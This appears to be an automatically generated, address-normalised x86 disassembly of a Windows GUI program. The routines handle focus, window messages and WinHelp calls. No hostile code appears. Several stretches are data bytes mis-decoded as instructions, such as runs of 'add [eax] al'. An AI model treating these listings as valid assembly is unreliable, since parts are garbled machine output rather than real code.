add esp 0xfffffff0
call sub_403470
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_42e830
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43c3b8
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_42e884
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_42e8a8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_4392fc
mov eax ebx
mov si 0xffb5
call sub_403360
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_43b8e8
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403360
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_42e920
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42b194
mov ebx eax
mov eax ebx
call sub_42b274
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_43b8e8
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42b374
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42e96c
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42b194
call sub_42b274
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_439d3c
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_42e998
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_438774
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_42e9d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42e7dc
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_4348c8
mov edx 0x19
mov eax esi
call sub_4348ec
mov dl 0x1
mov eax esi
call sub_43bb1c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42ea5c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_43bbec
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_43b8e8
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_43b8e8
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_42eab0
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_43bbec
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44bae0
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_4362b4
sub_42eae4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42e998
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_4386a0
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_42eb4c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_43ad64
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44b9e8
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403360
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403360
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42ebb9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42ec32
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43510c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44ba70
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43ad6c
mov eax ebx
mov si 0xffb8
call sub_403360
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403360
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ec39
sub_42ec40
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_43ad74
pop edi
pop esi
pop ebx
retn
sub_42ec94
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42b194
call sub_42b274
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_42ecc0
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42b194
mov ebx eax
mov eax ebx
call sub_42b274
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_43b8e8
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42b374
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42ed0c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42e7dc
mov edx 0x71
mov eax esi
call sub_4348c8
mov edx 0x11
mov eax esi
call sub_4348ec
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42ed74
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403360
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_42edb4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_438618
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4385dc
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_4415d0
sub_42ee70
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43bb1c
mov eax [ ebp - 0x4 ]
call sub_43bbec
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call SendMessageA
push ebp
call sub_42edb4
pop ecx
mov eax [ ebp - 0x4 ]
call sub_434d18
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403360
sub_42eefc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_42e998
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_4386a0
mov eax ebx
mov si 0xffc8
call sub_403360
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_42ef53
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x66bd173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_43b8e8
push eax
call SendMessageA
pop ebx
retn
sub_42ef88
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42effd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43510c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_44ba70
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43ad6c
mov eax ebx
mov si 0xffb8
call sub_403360
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f004
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_42f00c
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403360
jmp r-xdata
pop esi
retn
sub_42f03c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f061
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f068
retn
sub_42f078
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xf1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 8 ] dl
inc edx
add [ eax - 0x14000000 ] ah
or eax [ eax + eax + 0x28 ]
int3
sub_42f168
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_441420
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42f1a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f1c9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f1d0
retn
sub_42f1dc
push 0x6004616
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_42fb3f
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_42fccc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fb46
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403ec0
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_407ea0
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_42fc24
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_407ea0
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403ef0
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_42f388
mov eax [ ebp - 0x14 ]
call sub_40435c
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_42f274
push ebp
inc edx
add [ edi - 0xe ] bl
inc edx
add [ ecx - 0xe ] ch
inc edx
add [ 0x150042f2 ] cl
inc edx
add [ 0x250042f2 ] bl
inc edx
add [ 0x350042f2 ] ch
inc edx
add [ 0x450042f2 ] bh
inc edx
pop edi
inc edx
cmp dh [ edx + esi * 8 + 0x42 ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add [ ebp - 0xe ] cl
inc edx
add ch ch
int1
inc edx
add ch dh
int1
inc edx
add ch bh
int1
inc edx
add [ 0xffffffffe50042f2 ] al
xor eax 0x3d0042f2
inc edx
add [ ebp - 0xe ] al
inc edx
cmp dh [ edx + esi * 8 + 0x42 ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
int1
inc edx
add [ ebx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add eax 0xe50042f2
cmp dh [ edx + esi * 8 + 0x42 ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 8 + 0x42 ] bl
add [ eax + 0x42f2 ] bh
add [ eax ] al
add [ ebx + esi * 8 + 0x42 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0xd ] dh
inc edx
add [ eax + eax ] ah
add [ eax ] al
or al 0x12
inc eax
add [ ebx + esi + 0x57dc0040 ] dl
inc eax
add al ch
push edi
inc eax
add [ eax - 0x63ffbfcd ] ch
xor eax [ eax ]
clc
push edi
inc eax
add [ eax ] bl
xor [ eax ] eax
cld
std
inc edx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] bh
add [ eax ] al
test [ edx + 0x42 ] bl
add [ eax + eax ] bl
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42f43d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403e9c
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403f34
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ef0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f444
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ec0
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40421c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_42f388
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42f43d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403e9c
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403f34
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ef0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f444
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ec0
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40421c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_42f458
push ebx
mov ebx eax
mov eax ebx
call sub_42f788
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_40575c
sub_42f494
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42f4fb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42f388
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f502
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_42f50c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42f594
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_42f480
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40421c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f59b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ec0
retn
sub_42f5a7
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42f62f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_42fccc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f636
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ec0
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_42f388
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_40435c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42f5b4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42f62f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_42fccc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f636
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ec0
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_42f388
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_40435c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42f63c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42f734
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_42f388
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408b70
mov eax ebx
call sub_42fccc
test al al
je r-xdata
mov ecx sub_42f1dc
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f73b
lea eax [ ebp - 0x1c ]
call sub_403e9c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ec0
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_42f388
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_42fc24
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403ef0
mov eax [ ebp - 0x4 ]
call sub_40435c
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_40435c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42f7a4
push ebx
mov ebx eax
mov eax ebx
call sub_42f788
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_40575c
pop ebx
retn
mov eax rw-data
call sub_40575c
sub_42f7d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42f82c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f833
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_42f388
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_42f83c
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42f932
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408b30
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42f388
mov eax ebx
call sub_42fccc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f939
lea eax [ ebp - 0x110 ]
call sub_403e9c
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_40410c
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_42fc24
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_40410c
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_40435c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_42f950
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42f9b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f9b9
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_42f388
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_42f9c4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42fa44
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42f388
mov eax ebx
call sub_42fccc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fa4b
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42fc24
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
